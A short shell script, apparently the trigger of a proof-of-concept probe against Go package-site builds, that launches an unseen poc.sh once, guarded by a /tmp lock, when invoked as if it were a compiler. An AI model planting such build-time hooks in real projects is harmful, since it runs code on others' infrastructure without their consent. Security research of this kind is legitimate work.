#!/bin/sh

base=$(CDPATH= cd "$(dirname "$0")" && pwd -P) || exit 86
origin=$(CDPATH= cd "$base/.." && pwd -P) || exit 86
lock=/tmp/.go-cgo-pkgsite-v026-compiler
if (umask 077; set -C; : >"$lock") 2>/dev/null; then
	cd "$origin" || exit 86
	CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.26' \
	POLL_INTERVAL=5 POLL_TIMEOUT=90 \
		/bin/sh "$origin/poc.sh" \
		--target 'github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.22' || true
fi

exit 86
